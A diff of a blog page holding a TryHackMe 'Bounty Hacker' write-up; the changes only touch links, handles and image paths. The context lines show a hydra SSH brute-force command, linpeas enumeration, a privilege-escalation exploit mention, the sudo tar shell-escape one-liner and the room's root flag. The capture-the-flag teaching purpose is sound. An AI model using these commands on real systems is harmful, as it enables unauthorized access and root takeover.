@@ -48,17 +48,17 @@
 <meta property="og:locale" content="en" />
 <meta name="description" content="You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker! Bounty Hacker is a room in TryHackMe. In this article you will learn how to exploit the sudo misconfiguration when there is a password reusable vulnerability in the target machine." />
 <meta property="og:description" content="You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker! Bounty Hacker is a room in TryHackMe. In this article you will learn how to exploit the sudo misconfiguration when there is a password reusable vulnerability in the target machine." />
-<link rel="canonical" href="/posts/BountyHacker/" />
-<meta property="og:url" content="/posts/BountyHacker/" />
+<link rel="canonical" href="https://n3sh47.github.io/posts/BountyHacker/" />
+<meta property="og:url" content="https://n3sh47.github.io/posts/BountyHacker/" />
 <meta property="og:site_name" content="N3sh47" />
 <meta property="og:type" content="article" />
 <meta property="article:published_time" content="2022-09-04T06:42:24+00:00" />
 <meta name="twitter:card" content="summary" />
 <meta property="twitter:title" content="Bounty Hacker - TryHackMe" />
-<meta name="twitter:site" content="@_CyberPunk254" />
+<meta name="twitter:site" content="@Unkn0wn_T3chie" />
 <meta name="google-site-verification" content="googlea6220aea28337f81.html" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-09-04T06:42:24+00:00","datePublished":"2022-09-04T06:42:24+00:00","description":"You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker! Bounty Hacker is a room in TryHackMe. In this article you will learn how to exploit the sudo misconfiguration when there is a password reusable vulnerability in the target machine.","headline":"Bounty Hacker - TryHackMe","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/BountyHacker/"},"url":"/posts/BountyHacker/"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-09-04T06:42:24+00:00","datePublished":"2022-09-04T06:42:24+00:00","description":"You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker! Bounty Hacker is a room in TryHackMe. In this article you will learn how to exploit the sudo misconfiguration when there is a password reusable vulnerability in the target machine.","headline":"Bounty Hacker - TryHackMe","mainEntityOfPage":{"@type":"WebPage","@id":"https://n3sh47.github.io/posts/BountyHacker/"},"url":"https://n3sh47.github.io/posts/BountyHacker/"}</script>
 <!-- End Jekyll SEO tag -->
 
   
@@ -225,7 +225,7 @@
       
 
       
-      <a href="https://twitter.com/_CyberPunk254" aria-label="twitter"
+      <a href="https://twitter.com/Unkn0wn_T3chie" aria-label="twitter"
         target="_blank" rel="noopener">
         <i class="fab fa-twitter"></i>
       </a>
@@ -1188,71 +1188,6 @@
     
 
   
-    
-
-    
-    
-    
-
-    
-    
-
-    
-    
-    
-
-    
-      
-      
-
-      
-      
-
-      
-
-      
-    
-      
-      
-
-      
-      
-
-      
-
-      
-    
-
-    
-      
-
-        <!-- Add CDN URL -->
-        
-
-        <!-- Add image path -->
-        
-
-        
-        
-
-      
-
-      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
-
-      
-
-    
-
-    <!-- Add SVG placehoder to prevent layout reflow -->
-
-    
-
-    <!-- Bypass the HTML-proofer test -->
-    
-
-    
-
-  
 
   
 
@@ -1453,7 +1388,7 @@
 
       <em>
         
-          <a href="https://twitter.com/N3sh47">Munene John</a>
+          <a href="https://twitter.com/Unkn0wn_T3chie">Munene John</a>
         
       </em>
     </span>
@@ -1482,7 +1417,7 @@
 
 <!-- return element -->
 <span class="readtime" data-toggle="tooltip" data-placement="bottom"
-  title="974 words">
+  title="972 words">
   <em>5 min</em> read</span>
 
     </div>
@@ -1496,7 +1431,7 @@
 <strong>Bounty Hacker</strong> is a room in <a href="www.TryHackme.com">TryHackMe</a>. In this article you will learn 
 how to exploit the <strong>sudo</strong> misconfiguration when there is a password reusable vulnerability in the target machine.</p>
 
-<p><img data-src="/assets/pictures/Description.png" alt="Room Description" data-proofer-ignore>
+<p><img data-src="/assets/pictures/bountyhacker/Description.png" alt="Room Description" data-proofer-ignore>
 <em>Room Description</em></p>
 
 <p>Let’s do this…</p>
@@ -1524,7 +1459,7 @@ Discovered open port 22/tcp on 10.10.181.69
 <h2 id="port-80"><span class="mr-2">Port 80</span><a href="#port-80" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
 <p>First Let’s start with <strong>port 80</strong>.</p>
 
-<p><img data-src="/assets/pictures/TargetPort80.png" alt="port 80 web" data-proofer-ignore>
+<p><img data-src="/assets/pictures/bountyhacker/TargetPort80.png" alt="port 80 web" data-proofer-ignore>
 <em>Port 80</em>
 Went through the source code and nothing was interesting. 
 <br />
@@ -1551,7 +1486,7 @@ Name (10.10.149.154:nesh): anonymous
 Remote system type is UNIX.
 Using binary mode to transfer files.
 </span></pre></td></tr></tbody></table></code></div></div>
-<p><img data-src="/assets/pictures/ftp.png" alt="Ftp Image" data-proofer-ignore>
+<p><img data-src="/assets/pictures/bountyhacker/ftp.png" alt="Ftp Image" data-proofer-ignore>
 <em>ftp Service on port 21</em>
 <br />
 <br />
@@ -1589,7 +1524,7 @@ Performing the attack on <strong>Port 22</strong></p>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 </pre></td><td class="rouge-code"><pre><span class="go">hydra -l lin -P /home/nesh/tryhackme/BountyHacker 10.10.195.119  -t 4 ssh
 </span></pre></td></tr></tbody></table></code></div></div>
-<p><img data-src="/assets/pictures/hydra.png" alt="Hydra password Attack" data-proofer-ignore>
+<p><img data-src="/assets/pictures/bountyhacker/hydra.png" alt="Hydra password Attack" data-proofer-ignore>
 <em>Hydra Password attack</em></p>
 <div class="language-console highlighter-rouge"><div class="code-header">
         <span data-label-text="Console"><i class="fas fa-code small"></i></span>
@@ -1612,7 +1547,7 @@ Now that we have the needed credentials to ssh to the machine, Let’s do it …
 
 <p><code class="language-plaintext highlighter-rouge">$ ssh lin@10.10.149.154</code></p>
 
-<p><img data-src="/assets/pictures/ssh.png" alt="ssh login" data-proofer-ignore>
+<p><img data-src="/assets/pictures/bountyhacker/ssh.png" alt="ssh login" data-proofer-ignore>
 <em>SSH Login on port 22</em></p>
 <div class="language-console highlighter-rouge"><div class="code-header">
         <span data-label-text="Console"><i class="fas fa-code small"></i></span>
@@ -1641,12 +1576,12 @@ the target system.
 <br />
 I uploaded the linpeas script to my port 80, so that I can go on the target machine to <code style="color: green">/tmp</code> directory and run the script.
 <br />
-<img data-src="/assets/pictures/tun0.png" alt="port 80" data-proofer-ignore>
+<img data-src="/assets/pictures/bountyhacker/tun0.png" alt="port 80" data-proofer-ignore>
 <em>Local host</em>
 <br /></p>
 
 <p>I need to go to the <code style="color: green">/tmp</code> to download the script to the script.
-<img data-src="/assets/pictures/linpeas.png" alt="Linpeas Script" data-proofer-ignore>
+<img data-src="/assets/pictures/bountyhacker/linpeas.png" alt="Linpeas Script" data-proofer-ignore>
 <em>Linpeas Script</em>
 It’s time to run the script …</p>
 <div class="language-console highlighter-rouge"><div class="code-header">
@@ -1654,7 +1589,7 @@ It’s time to run the script …</p>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 </pre></td><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>./linpeas.sh
 </pre></td></tr></tbody></table></code></div></div>
-<p><img data-src="/assets/pictures/script.png" alt="Script" data-proofer-ignore>
+<p><img data-src="/assets/pictures/bountyhacker/script.png" alt="Script" data-proofer-ignore>
 <em>Linpeas Script</em>
 Found the target was vulnerable to <code style="color: green">CVE-2020-4034</code>.
 <br />
@@ -1666,7 +1601,7 @@ Found the target was vulnerable to <code style="color: green">CVE-2020-4034</cod
 <p><br />
 There are two versions of the CVE exploit: <code class="language-plaintext highlighter-rouge">Python3 Exploit</code> <code class="language-plaintext highlighter-rouge">C language exploit</code>
 I uploaded the CVE exploit to my port 80 and went to the target machine and downloaded it there.
-<img data-src="/assets/pictures/cve.png" alt="CVE" data-proofer-ignore>
+<img data-src="/assets/pictures/bountyhacker/cve.png" alt="CVE" data-proofer-ignore>
 After running the script I was in root group. And collected the root flag 
 <code class="language-plaintext highlighter-rouge">root.txt</code></p>
 <div class="language-html highlighter-rouge"><div class="code-header">
@@ -1674,7 +1609,7 @@ After running the script I was in root group. And collected the root flag
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 </pre></td><td class="rouge-code"><pre>THM{80UN7Y_h4cK3r}
 </pre></td></tr></tbody></table></code></div></div>
-<p><img data-src="/assets/pictures/root.png" alt="Root" data-proofer-ignore>
+<p><img data-src="/assets/pictures/bountyhacker/root.png" alt="Root" data-proofer-ignore>
 <em>Machine Pwned</em></p>
 <h2 id="method-2-using-gtfobins"><span class="mr-2">method 2: Using GTFOBINs</span><a href="#method-2-using-gtfobins" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
 <p>GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.</p>
@@ -1699,16 +1634,15 @@ User lin may run the following commands on bountyhacker:
 <p>Using the command <code class="language-plaintext highlighter-rouge">$ sudo -l</code> , we see that the user <code class="language-plaintext highlighter-rouge">lin</code> can run the <code style="color:green;">/bin/tar</code> command with <code class="language-plaintext highlighter-rouge">root</code> priviledges.
 <br />
 Let’s see what <code class="language-plaintext highlighter-rouge">GTFOBINS</code> has for us …
-<img data-src="/assets/pictures/gtf.png" alt="GTFOBINS" data-proofer-ignore>
-<em>GTFOBINS Github</em>
+<img data-src="/assets/pictures/bountyhacker/targtf.png" alt="Gtfobins" data-proofer-ignore>
 Now let’s run the command on our target..</p>
 <div class="language-console highlighter-rouge"><div class="code-header">
         <span data-label-text="Console"><i class="fas fa-code small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 </pre></td><td class="rouge-code"><pre><span class="go">sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 </span></pre></td></tr></tbody></table></code></div></div>
-<p><img data-src="/assets/pictures/targtf.png" alt="Gtfobins" data-proofer-ignore>
-<img data-src="/assets/pictures/final.png" alt="pwned" data-proofer-ignore>
+
+<p><img data-src="/assets/pictures/bountyhacker/final.png" alt="pwned" data-proofer-ignore>
 <em>Machine Pwned</em>
 There is need upgrade the shell</p>
 <div class="language-console highlighter-rouge"><div class="code-header">
@@ -1807,19 +1741,19 @@ There is need upgrade the shell</p>
 
     
       
-        <a href="https://twitter.com/intent/tweet?text=Bounty+Hacker+-+TryHackMe+-+N3sh47&url=%2Fposts%2FBountyHacker%2F" data-toggle="tooltip" data-placement="top"
+        <a href="https://twitter.com/intent/tweet?text=Bounty+Hacker+-+TryHackMe+-+N3sh47&url=https%3A%2F%2Fn3sh47.github.io%2Fposts%2FBountyHacker%2F" data-toggle="tooltip" data-placement="top"
           title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
           <i class="fa-fw fab fa-twitter"></i>
         </a>
     
       
-        <a href="https://www.facebook.com/sharer/sharer.php?title=Bounty+Hacker+-+TryHackMe+-+N3sh47&u=%2Fposts%2FBountyHacker%2F" data-toggle="tooltip" data-placement="top"
+        <a href="https://www.facebook.com/sharer/sharer.php?title=Bounty+Hacker+-+TryHackMe+-+N3sh47&u=https%3A%2F%2Fn3sh47.github.io%2Fposts%2FBountyHacker%2F" data-toggle="tooltip" data-placement="top"
           title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
           <i class="fa-fw fab fa-facebook-square"></i>
         </a>
     
       
-        <a href="https://t.me/share/url?url=%2Fposts%2FBountyHacker%2F&text=Bounty+Hacker+-+TryHackMe+-+N3sh47" data-toggle="tooltip" data-placement="top"
+        <a href="https://t.me/share/url?url=https%3A%2F%2Fn3sh47.github.io%2Fposts%2FBountyHacker%2F&text=Bounty+Hacker+-+TryHackMe+-+N3sh47" data-toggle="tooltip" data-placement="top"
           title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
           <i class="fa-fw fab fa-telegram"></i>
         </a>
@@ -2139,10 +2073,10 @@ This is a Mr Robot themed CTF originally taken from Vulnhub.Here We Bruteforce W
 
 
 <em class="small"
-    data-ts="1663644642"
+    data-ts="1664678592"
     data-df="ll"
     >
-  Sep 20, 2022
+  Oct  2, 2022
 </em>
 
             <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Eternal Blue - TryHackMe</h3>
@@ -2208,7 +2142,7 @@ EternalBlue is a computer exploit developed by the U.S. National Security Agency
     <div class="footer-left">
       <p class="mb-0">
         © 2022
-        <a href="https://twitter.com/N3sh47">Munene John</a>.
+        <a href="https://twitter.com/Unkn0wn_T3chie">Munene John</a>.
         
         <span data-toggle="tooltip" data-placement="top"
           title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span>
